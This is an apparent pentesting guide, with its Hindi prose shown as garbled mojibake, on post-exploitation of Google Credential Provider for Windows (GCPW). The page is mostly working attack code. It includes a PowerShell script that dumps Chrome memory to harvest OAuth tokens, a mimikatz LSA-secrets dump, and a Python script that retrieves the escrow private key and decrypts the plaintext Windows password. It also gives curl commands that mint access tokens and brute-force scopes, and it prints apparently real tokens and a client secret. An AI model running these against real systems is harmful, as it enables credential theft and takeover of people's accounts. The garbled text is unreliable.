‡§Ø‡§π ‡§¶‡•á‡§ñ‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ï‡§ø AESGCM ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à, ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§ü‡•ã‡§ï‡§® ‡§è‡§ï **‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£** (**`v10`** ‡§á‡§∏ ‡§∏‡§Æ‡§Ø) ‡§∏‡•á ‡§∂‡•Å‡§∞‡•Ç ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§´‡§ø‡§∞ ‡§á‡§∏‡§Æ‡•á‡§Ç [**12B ‡§ï‡§æ ‡§®‡•â‡§®‡§∏**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42) ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§á‡§∏‡§Æ‡•á‡§Ç **‡§∏‡§æ‡§á‡§´‡§∞-‡§ü‡•á‡§ï‡•ç‡§∏‡•ç‡§ü** ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§Ö‡§Ç‡§§‡§ø‡§Æ **mac 16B** ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§

### GCPW - ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§∏‡•á ‡§ü‡•ã‡§ï‡§® ‡§°‡§Ç‡§™ ‡§ï‡§∞‡§®‡§æ

‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó **Chrome** ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§ï‡•ã **dump** ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, `procdump` ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á, **‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó‡•ç‡§∏** ‡§ï‡•ã ‡§®‡§ø‡§ï‡§æ‡§≤‡•á‡§Ç ‡§î‡§∞ ‡§´‡§ø‡§∞ **access ‡§î‡§∞ refresh tokens** ‡§∏‡•á ‡§∏‡§Ç‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó‡•ç‡§∏ ‡§ï‡•á ‡§≤‡§ø‡§è **‡§ñ‡•ã‡§ú‡•á‡§Ç**‡•§ ‡§Ø‡§¶‡§ø Chrome ‡§ï‡§ø‡§∏‡•Ä Google ‡§∏‡§æ‡§á‡§ü ‡§∏‡•á ‡§ú‡•Å‡§°‡§º‡§æ ‡§π‡•à, ‡§§‡•ã ‡§ï‡•Å‡§õ **‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§Æ‡•á‡§Ç ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§î‡§∞/‡§Ø‡§æ ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§ï‡§∞ ‡§∞‡§π‡•Ä ‡§π‡•ã‡§ó‡•Ä!**

<details>

<summary>Chrome ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§°‡§Ç‡§™ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§ü‡•ã‡§ï‡§® ‡§ñ‡•ã‡§ú‡•á‡§Ç</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

‡§Æ‡•à‡§Ç‡§®‡•á `gcpw_extension.exe` ‡§ï‡•á ‡§∏‡§æ‡§• ‡§µ‡§π‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡•Ä ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ø‡§π ‡§ï‡•ã‡§à ‡§ü‡•ã‡§ï‡§® ‡§®‡§π‡•Ä‡§Ç ‡§Æ‡§ø‡§≤‡§æ‡•§

‡§ï‡§ø‡§∏‡•Ä ‡§ï‡§æ‡§∞‡§£ ‡§∏‡•á, **‡§ï‡•Å‡§õ ‡§®‡§ø‡§ï‡§æ‡§≤‡•á ‡§ó‡§è ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§Ç‡§ó‡•á (‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø ‡§ï‡•Å‡§õ ‡§π‡•ã‡§Ç‡§ó‡•á)**‡•§ ‡§Æ‡•à‡§Ç‡§®‡•á ‡§°‡§Ç‡§™ ‡§∏‡•á ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§ü‡•ã‡§ï‡§® ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï-‡§è‡§ï ‡§ï‡§∞‡§ï‡•á ‡§Ö‡§ï‡•ç‡§∑‡§∞ ‡§π‡§ü‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§æ ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§ø‡§Ø‡§æ‡•§ ‡§Ø‡§π ‡§Æ‡•Å‡§ù‡•á ‡§ï‡§≠‡•Ä ‡§≠‡•Ä ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§ü‡•ã‡§ï‡§® ‡§ñ‡•ã‡§ú‡§®‡•á ‡§Æ‡•á‡§Ç ‡§Æ‡§¶‡§¶ ‡§®‡§π‡•Ä‡§Ç ‡§Æ‡§ø‡§≤‡•Ä, ‡§≤‡•á‡§ï‡§ø‡§® ‡§Æ‡•Å‡§ù‡•á ‡§≤‡§ó‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§Ø‡§π ‡§Æ‡§¶‡§¶ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:

<details>

<summary>‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡•á‡§Ç ‡§Ö‡§ï‡•ç‡§∑‡§∞‡•ã‡§Ç ‡§ï‡•ã 1-1 ‡§ï‡§∞‡§ï‡•á ‡§π‡§ü‡§æ‡§ï‡§∞</summary>
```bash
#!/bin/bash

# Define the initial access token
access_token="ya29.a0AcM612wWX6Pe3Pc6ApZYknGs5n66W1Hr1CQvF_L_pIm3uZaXWisWFabzxheYCHErRn28l2UOJuAbMzfn1TUpSKqvYvlhXJpxQsKEtwhYXzN2BZdOQNji0EXfF7po1_0WaxhwqOiE0CFQciiL8uAmkRsoXhq9ekC_S8xLrODZ2yKdDR6gSFULWaiIG-bOCFx3DkbOdbjAk-U4aN1WbglUAJdLZh7DMzSucIIZwKWvBxqqajSAjrdW0mRNVN2IfkcVLPndwj7fQJV2bQaCgYKAbQSAQ4SFQHGX2MiPuU1D-9-YHVzaFlUo_RwXA0277"

# Define the URL for the request
url="https://www.googleapis.com/oauth2/v1/tokeninfo"

# Loop until the token is 20 characters or the response doesn't contain "error_description"
while [ ${#access_token} -gt 20 ]; do
# Make the request and capture the response
response=$(curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$access_token" $url)

# Check if the response contains "error_description"
if [[ ! "$response" =~ "error_description" ]]; then
echo "Success: Token is valid"
echo "Final token: $access_token"
echo "Response: $response"
exit 0
fi

# Remove the last character from the token
access_token=${access_token:0:-1}

echo "Token length: ${#access_token}"
done

echo "Error: Token invalid or too short"
```
</details>

### GCPW - ‡§∏‡•ç‡§™‡§∑‡•ç‡§ü ‡§™‡§æ‡§† ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ï‡•ã ‡§™‡•Å‡§®‡§∞‡•ç‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡§æ

GCPW ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§∏‡•ç‡§™‡§∑‡•ç‡§ü ‡§™‡§æ‡§† ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ï‡•ã ‡§™‡•Å‡§®‡§∞‡•ç‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, **mimikatz** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á **LSASS** ‡§∏‡•á ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ï‡•ã ‡§°‡§Ç‡§™ ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à:
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
‡§´‡§ø‡§∞ ‡§õ‡§ø‡§™‡•á ‡§π‡•Å‡§è ‡§ï‡•ã `Chrome-GCPW-<sid>` ‡§ï‡•Ä ‡§§‡§∞‡§π ‡§ñ‡•ã‡§ú‡•á‡§Ç ‡§ú‡•à‡§∏‡•á ‡§ï‡§ø ‡§ö‡§ø‡§§‡•ç‡§∞ ‡§Æ‡•á‡§Ç:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

‡§´‡§ø‡§∞, ‡§è‡§ï **access token** ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§¶‡§æ‡§Ø‡§∞‡§æ `https://www.google.com/accounts/OAuthLogin` ‡§π‡•à, ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ï‡•ã ‡§°‡§ø‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§®‡§ø‡§ú‡•Ä ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§ï‡§æ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à:

<details>

<summary>Access token, ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§î‡§∞ ‡§∏‡§Ç‡§∏‡§æ‡§ß‡§® ‡§Ü‡§à‡§°‡•Ä ‡§¶‡§ø‡§è ‡§ú‡§æ‡§®‡•á ‡§™‡§∞ ‡§∏‡•ç‡§™‡§∑‡•ç‡§ü ‡§™‡§æ‡§† ‡§Æ‡•á‡§Ç ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

‡§á‡§∏‡§Æ‡•á‡§Ç ‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§ò‡§ü‡§ï‡•ã‡§Ç ‡§ï‡•ã Chromium ‡§∏‡•ç‡§∞‡•ã‡§§ ‡§ï‡•ã‡§° ‡§Æ‡•á‡§Ç ‡§™‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:

* API ‡§°‡•ã‡§Æ‡•á‡§®: [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* API ‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü: [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)

### GCPW - ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§® ‡§∏‡•á ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡§®‡§æ

‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§® ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§á‡§∏‡•á ‡§î‡§∞ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§Æ‡•á‡§Ç ‡§®‡§ø‡§∞‡•ç‡§¶‡§ø‡§∑‡•ç‡§ü ‡§ï‡•ç‡§≤‡§æ‡§á‡§Ç‡§ü ‡§Ü‡§à‡§°‡•Ä ‡§î‡§∞ ‡§ï‡•ç‡§≤‡§æ‡§á‡§Ç‡§ü ‡§∏‡•Ä‡§ï‡•ç‡§∞‡•á‡§ü ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à:
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Scopes

{% hint style="info" %}
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§® ‡§π‡•ã‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§µ‡§ú‡•Ç‡§¶, ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§∏‡•ç‡§ï‡•ã‡§™ ‡§ï‡§æ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ü‡§™ ‡§ï‡•á‡§µ‡§≤ **‡§â‡§® ‡§∏‡•ç‡§ï‡•ã‡§™ ‡§ï‡§æ ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§â‡§∏ ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§ø‡§§ ‡§π‡•à‡§Ç ‡§ú‡§π‡§æ‡§Ç ‡§Ü‡§™ ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç**‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§® ‡§π‡§∞ ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§Æ‡•á‡§Ç ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§
{% endhint %}

‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á GCPW ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§π‡§∞ ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ OAuth ‡§∏‡•ç‡§ï‡•ã‡§™ ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§ó‡•Ä, ‡§á‡§∏‡§≤‡§ø‡§è ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§π‡§Æ ‡§â‡§® ‡§∏‡•ç‡§ï‡•ã‡§™ ‡§ï‡•ã ‡§ñ‡•ã‡§ú ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡§ø‡§®‡•ç‡§π‡•á‡§Ç `refresh_token` ‡§ï‡•á ‡§∏‡§æ‡§• `access_token` ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

‡§î‡§∞ ‡§Ø‡§π ‡§µ‡§π ‡§Ü‡§â‡§ü‡§™‡•Å‡§ü ‡§π‡•à ‡§ú‡•ã ‡§Æ‡•Å‡§ù‡•á ‡§≤‡•á‡§ñ‡§® ‡§ï‡•á ‡§∏‡§Æ‡§Ø ‡§Æ‡§ø‡§≤‡§æ:
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, Chromium ‡§∏‡•ç‡§∞‡•ã‡§§ ‡§ï‡•ã‡§° ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡§®‡•á ‡§™‡§∞ [**‡§á‡§∏ ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ã ‡§¢‡•Ç‡§Ç‡§¢‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24), ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç **‡§Ö‡§®‡•ç‡§Ø ‡§∏‡•ç‡§ï‡•ã‡§™** ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à‡§Ç ‡§ú‡•ã **‡§™‡§π‡§≤‡•á ‡§∏‡•á ‡§¨‡•ç‡§∞‡•Ç‡§ü-‡§´‡•ã‡§∞‡•ç‡§∏ ‡§ï‡•Ä ‡§ó‡§à ‡§∏‡•Ç‡§ö‡•Ä ‡§Æ‡•á‡§Ç ‡§®‡§π‡•Ä‡§Ç ‡§¶‡§ø‡§ñ‡§æ‡§à ‡§¶‡•á‡§§‡•á**‡•§ ‡§á‡§∏‡§≤‡§ø‡§è, ‡§á‡§® ‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ ‡§∏‡•ç‡§ï‡•ã‡§™ ‡§ï‡•ã ‡§Æ‡§æ‡§®‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:

<details>

<summary>‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ ‡§∏‡•ç‡§ï‡•ã‡§™</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
